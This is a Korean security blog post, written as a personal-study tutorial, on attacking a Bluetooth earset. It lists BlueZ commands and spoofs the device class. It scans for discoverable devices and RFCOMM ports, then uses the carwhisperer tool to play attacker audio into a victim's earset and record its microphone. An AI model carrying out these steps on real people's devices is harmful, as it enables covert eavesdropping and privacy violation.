---
date: 2013-03-18 19:09:00 +0900
title: 블루투스 이어폰 해킹하기
categories: [Research, bluetooth]
tags: [research, bluetooth, hacking]
---
---
**:: WARNING ::**

이 포스트는 개인 공부를 위해 게시된 글입니다. 악의적으로 이용시 모든 책임은 당사자에게 있으며 작성자는 책임을 지지 않겠습니다.

---

## 0x01. 블루투스 환경
1) Hacker : Bluetooth-v2.1 (os : kali linux)  
2) Victim - Earset : Bluetooth-v3.0  
3) SmartPhone : Bluetooth-v4.0

## 0x02. Command & Tool
1) hciconfig
    > local블루투스에 관한 정보를 출력 또는 수정  

2) hcitool
   > 특정 장치로 command를 전송하고나 설정을 하는 명령어

3) hcidump
   > 블루투스패킷을 잡는 명령어입니다.(블루투스패킷은 wireshark로 잡히지 않아서 이 명령어를 사용)  

4) l2ping
   > l2cap을 이용하여 상대 장비에게 ping을 보내는 명령어

5) rfcomm
   > rfcomm프로토콜에 관해 설정하는 명령어  

6) sdptool
   > 특정 장비에서 지원하는 서비스 목록을 볼수 있습니다.  

7) carwhisperer
   > 핸드프리 블루투스 카 키트를 지원하는 자동차를 대상으로 하는 공격입니다.
   > ~~이 글에서는 carwhisperer대신 이 코드를 수정한 poc툴을 쓰겠습니다.~~ (별 차이 없으니 carwhisperer을 쓰셔도 모두 막힘이 없습니다.)  
   > - 다운로드 : [Link](http://trifinite.org/Downloads/carwhisperer-0.2.tar.gz)


## 0x03. Basic about Bluetooth
1) 블루투스란?
   - 저전력을 이용한 근거리 무선통신(기본 10m이고 옵션이 가해지면 100m까지 통신)

2) 블루투스 프로토콜 구조

    ![bluetooth-protocol-struct](/posts/bluetooth-structures.jpeg)

    - HCI(Host Controller Inerfae) :: 하드웨어 접근제어  
    - L2CAP :: 상위프로토콜과 하위프로토콜 사이 중재역할을합니다.
    - SDP :: 블루투스가 어떠한 서비스가 가능한지 출력합니다.  
    - RFCOMM :: RS-232(_시리얼통신 인터페이스 표준_) 시리얼포트를 에뮬레이션합니다.


3) Pairing(페어링)
- 두개의 장치가 서로를 인증한 후 Connection하는 과정. 이 과정에서 pin 인증  
- 이 글에서 사용한 블루투스 이어셋은 검색만 허용된다면 PIN인증 없이 연결이 됩니다.

## 0x04. Scenario

1) 해커의 반경안에 블루투스 이어셋을 이용하는 사용자가 있다.

2) 해당 이어셋에 공격을 가하고, 사용자의 이어셋에는 해커가 준비한 음성파일이 흘러나온다.

3) 또 사용자가 이어셋의 마이크로 말하는 내용은 해커 컴퓨터에 저장된다.

## 0x05. Attack

```bash
hciconfig hci0 up    #    블루투스 on
hciconfig hci0 class 0x50040c    #노트북을 스마트폰으로 인식시키기 위한 설정명령어
                                   #class정보는 hciconfig -a를 입력하면 출력된다.
```

여기서 class를 CoD(Class of Device)라고 한다.
- Bluetooth Class of Device/Service (CoD) Generator  
- Link: [CoD Generator](http://bluetooth-pentest.narod.ru/software/bluetooth_class_of_device-service_generator.html)

![bluetooth-hciconfig](/posts/bluetooth-hciconfig.jpeg)
- 주변의 블루투스 장치를 찾습니다. 단, `검색허용`이 된 장치에 한해서 검색이 됩니다.
    ```bash
    hcitool scan  
        Scanning ...  
        9C:3A:AF:A7:40:65    HM1200
    ```

- rfcomm.py 스크립트를 이용하여 'HM1200'장치에 열린 포트를 검색하겠습니다.
   ```bash
    # ./rfcommScan.py 9C:3A:AF:A7:40:65  
    [+] RFCOMM Port 1 open  
    [+] RFCOMM Port 2 open  
    [+] RFCOMM Port 3 open  
    [+] RFCOMM Port 4 open
    ```

- 자, 모든 정보를 획득했으니 마지막 작업을 해보겠습니다.
    ```plain
    carwhisperer <hci#> <message> <recored> <bdaddr> \[channel\]

    message : 전송할 음성파일인데 확장자가 raw여야 합니다.

    record    : 이어셋의 마이크에서 전송되는 데이터입니다. 저장은 raw로 하시고 음성파일 확장자로 변경하시면 끝!

    bdaddr    : 피해자 블루투스의 mac주소가 되겠습니다.

    channel    : Open된 RFCOMM 채널을 입력하면 되고, 입력을 하지 않을경우 1로 입력이 됩니다.
    ```

![bluetooth-poc](/posts/bluetooth-poc.jpeg)

위의 과정을 제대로 수행하셨다면 별다른 착오없이 공격이 성공했을 것입니다.  
아래의 사진은 hcidump로 캡처한 패킷들이고, 공격중에 많은 패킷이 오가는 것을 보실수 있습니다.

![bluetooth-packet-capture](/posts/bluetooth-packet-caputre.jpeg)

## 0x06. End
오랜만에 긴글 쓰려니 힘들긴 한데, 나름 재밌는 주제였습니다. 사실 처음 블루투스에 접근한 계기는 좀더 화려했으나 그 길을 가는 도중에 맨붕이 와서 일단 여기까지만 블로깅했습니다. 혹시 잘못된점이나 잘 안되는점, 또 궁금한점이 있으면 글남겨주세요. 바로바로 확인하겠습니다 :)